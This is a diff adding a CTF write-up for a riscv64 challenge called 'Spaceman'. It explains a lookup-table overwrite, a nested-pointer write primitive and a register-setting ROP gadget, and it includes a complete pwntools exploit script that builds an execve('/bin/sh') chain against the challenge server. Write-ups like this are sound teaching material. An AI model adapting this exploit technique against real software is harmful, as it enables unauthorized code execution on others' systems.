@@ -338,6 +338,207 @@ if __name__=="__main__":
 
 ## Spaceman
 
+This challenge is a riscv64 challenge that is statically linked and has no PIE. 
+We are able to give the program the name of the command, and then it will call a lookup 
+table to call the function for that specific command.
 
+When we are prompted to get a command we have a 0x10 byte overwrite of the lookup table.
+This will allow us to overwrite the command name and the command function. 
+
+This is our first primitive that we found. The restrictions for this is that when we overwrite
+a function a0 = 0, a1 = (cmd), a2 = len(cmd). 
+
+
+CMD\_BUF     
+
+---
+
+CMD\_PTR -> "help" | CMD\_FUNC  
+
+
+Our first goal is to read into writable data. To do this, we need
+four nested pointers as shown below
+
+
+> 0x8a488 => 0x8a2b8 => 0x8a518 => writeable mem
+> pp\_addr -> p\_addr -> writeable\_ptr -> writeable mem
+ 
+We need the pp\_addr in order to change our writable ptr, and we need the
+p\_addr in order to use our writable data.
+
+
+So we created a function to read in data into the writable section of memory
+that we found. We did this by calling read(0, writable\_addr, len(writable\_addr))
+which will read in three bytes at a time, and then calling read(0, p\_addr, len(writeable\_addr))
+to increment the pointer to the writable address by three.
+
+
+We then called openat, using the same restrictions as before. However, we got stuck after this
+because there weren't any other functions that we could use with these restrictions.
+
+That's when we realized that there was another primitive. When inputing our username, we are given 
+0x30 bytes, and when starting a rop chain. What is next in the stack is our username buffer. 
+
+Therefore, we decided to pivot and try to find a rop gadget. We didn't end up finding
+one before the ctf ended, mainly because we were only looking for gadgets that 
+had ld ra, (sp), jalr ra. 
+
+At the end of the ctf, we realized that there was this gadget that sets almost every 
+register. 
+
+Our initial plan was to call sys\_sendfile to send the flag fd to stdout. But
+an sys\_execve would work better here. 
+
+```
+0002c3ba  03370900   ld      a4, 0x0(s2)
+0002c3be  a268       ld      a7, 0x8(sp) {var_b8_1}
+0002c3c0  4266       ld      a2, 0x10(sp) {var_b0_1}
+0002c3c2  a275       ld      a1, 0x28(sp) {var_98_1}
+0002c3c4  0275       ld      a0, 0x20(sp) {var_a0_1}
+0002c3c6  6263       ld      t1, 0x18(sp) {var_a8_1}
+0002c3c8  bae4       sd      a4, 0x48(sp) {var_78}
+0002c3ca  d287       mv      a5, s4
+0002c3cc  0148       li      a6, 0x0
+0002c3ce  0147       li      a4, 0x0
+0002c3d0  a286       mv      a3, s0
+0002c3d2  0293       jalr    t1
+```
+
+The final exploit script is below which reads in "/bin/sh" and then calls 
+execve
+
+```python
+
+#! /usr/bin/python
+from pwn import *
+
+context.update(
+        arch="amd64",
+        endian="little",
+        log_level="debug",
+        os="linux",
+        terminal=["alacritty", "-e"]
+)
+
+to = 2
+ru = lambda p,s: p.recvuntil(s, timeout=to)
+rl = lambda p: p.recvline()
+sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
+sl = lambda p,a: p.sendline(a)
+up = lambda b: int.from_bytes(b, byteorder="little")
+
+SERVICE = "challs.pwnoh.io"
+PORT = 13372
+
+def start(binary):
+
+    gs = '''
+        set context-sections stack regs disasm
+        set show-compact-regs on
+        set resolve-heap-via-heuristic on
+        set follow-fork-mode parent
+        set architecture riscv:rv64
+        target remote localhost:1234
+    '''
+
+    if args.GDB:
+        return process(['qemu-riscv64', '-g', '1234', 'spaceman'], level='error')
+    elif args.REMOTE:
+        return remote(SERVICE,PORT)
+    else:
+        return process(binary)
+
+
+def write_three_bytes(io, p_addr, addr, data):
+    payload = b"A"*0x10 + p64(p_addr)
+    payload += p64(e.sym["read"]) # make look up table point to anywhere
+
+    sla(io, b"COMMAND>", payload)
+    sla(io, b"COMMAND>", p64(addr))
+
+    sl(io, data)
+
+def write_data(io, pp_addr, p_addr, addr, data):
+    data = b"AAA\x00\x00" + data
+
+    for i in range(int(len(data) / 3)):
+        print(data[i * 3: i * 3 + 3])
+        # write three bytes at writable data
+        write_three_bytes(io, p_addr, addr, data[i * 3: i * 3 + 4])
+        addr += 3
+
+        # increase addr by 3 
+        write_three_bytes(io, pp_addr, p_addr, p32(addr))
+
+
+# Calls func with func(0, addr, 3)
+def call_func(io, p_addr, addr, func):
+    payload = b"A"*0x10 + p64(p_addr)
+    payload += p64(func) 
+
+    sla(io, b"COMMAND>", payload)
+    sla(io, b"COMMAND>", p64(addr))
+
+
+def exploit(io,e):
+    sleep(5)
+    # 0x8a488 => 0x8a2b8 => 0x8a518 => writeable mem
+    # pp_addr -> p_addr -> writeable_ptr -> writeable mem
+
+    flag_fd = 5
+    p_addr = 0x8a2b8
+    pp_addr = 0x8a488
+    writable_addr = 0x8a510
+    gadget = 0x2c3be
+
+    ecall_num = p64(0xdd) # execve 221
+    third_arg = p64(0)
+    ecall = p64(0x1d8ac) # ecall; ret gadget
+    first_arg = p64(writable_addr+0x10) # ptr to "/bin/sh"
+    second_arg = p64(0)
+
+    chain = b"A" * 8
+    chain += ecall_num + third_arg
+    chain += ecall + first_arg
+    chain += second_arg
+
+    sla(io, b"LOGIN: ", chain)
+
+    #data = b"/app/flag.txt"
+
+    data = b"/bin/sh\x00\x00"
+
+    # write /bin/sh
+    write_data(io, pp_addr, p_addr, writable_addr+0xb, data)
+
+    # set ptr back to beginning of writeable data
+    write_three_bytes(io, pp_addr, p_addr, p32(writable_addr+0x10))
+
+    #call_func(io,p_addr,writeable_addr,e.sym["openat"]) 
+
+    # write ROP
+    write_three_bytes(io, pp_addr, p_addr, p32(writable_addr))
+    write_data(io, pp_addr, p_addr, writable_addr - 5, p64(0x5))
+    write_three_bytes(io, pp_addr, p_addr, p32(writable_addr))
+
+    payload = b"A"*0x10 + p64(p_addr)
+    payload += p64(gadget)
+    sla(io, b"COMMAND>", payload)
+    sla(io, b"COMMAND>", p64(writable_addr))
+
+    io.interactive()
+
+
+if __name__=="__main__":
+    file = args.BIN
+
+    p = start(file)
+    e = context.binary = ELF(file)
+    #l = ELF("./libc.so.6")
+
+    exploit(p,e)
+```
 
 ## Gent's Favorite Model
+
+
